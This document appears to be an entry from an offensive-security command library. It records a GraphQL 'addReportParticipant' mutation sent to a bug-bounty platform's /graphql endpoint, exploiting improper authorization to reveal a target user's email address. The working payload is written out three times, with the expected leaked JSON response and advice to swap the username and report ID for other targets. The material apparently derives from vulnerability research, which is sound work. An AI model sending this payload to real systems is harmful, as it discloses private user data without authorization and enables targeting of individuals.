---
data: >-
  POST /graphql HTTP/1.1 {"query":"mutation
  Revoke_credential_mutation($input_0:AddReportParticipantInput!)
  {addReportParticipant(input:$input_0) {clientMutationId,...F1}}  fragment F1
  on AddReportParticipantPayload
  {clientMutationId,was_successful,errors{nodes{message}},invitation{email,token}}","variables":{"input_0":{"report_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE=","email":"██████████","username":"jobert"}}}
tags:
  - graphql
  - mutation
  - exploit
type: command
executor: bash
platforms:
  - Web
id: 1cf19e4a-c103-43da-b04b-3720c25fdaea
created_at: '2025-12-11T06:09:21.283Z'
updated_at: '2025-12-11T06:09:21.283Z'
verified: false
validated: true
submitted: true
---
# graphql-add-report-participant-mutation

## Command

```bash
POST /graphql HTTP/1.1 {"query":"mutation Revoke_credential_mutation($input_0:AddReportParticipantInput!) {addReportParticipant(input:$input_0) {clientMutationId,...F1}}  fragment F1 on AddReportParticipantPayload {clientMutationId,was_successful,errors{nodes{message}},invitation{email,token}}","variables":{"input_0":{"report_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE=","email":"██████████","username":"jobert"}}}
```

## Description

Sends a GraphQL mutation to the /graphql endpoint to add a report participant by username, exploiting improper authorization to return the user's email address in the response. Use this when a valid base64-encoded report_id and target username are known.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `query` | Defines the GraphQL mutation and fragment to retrieve invitation details including email | Yes |
| `variables` | Contains input_0 with report_id (base64-encoded), email (redacted or blank), and username (target) | Yes |

## Examples

### Basic Usage

```bash
POST /graphql HTTP/1.1 {"query":"mutation Revoke_credential_mutation($input_0:AddReportParticipantInput!) {addReportParticipant(input:$input_0) {clientMutationId,...F1}}  fragment F1 on AddReportParticipantPayload {clientMutationId,was_successful,errors{nodes{message}},invitation{email,token}}","variables":{"input_0":{"report_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE=","email":"██████████","username":"jobert"}}}
```

### Advanced Usage

Modify the username and report_id for different targets.

## Expected Output

A JSON response like: {"data":{"addReportParticipant":{"clientMutationId":null,"was_successful":true,"errors":{"nodes":[]},"invitation":{"email":"████","token":null}}}}

## Related

- [[procedures/Exploit-GraphQL-addReportParticipant-for-Email-Disclosure]]
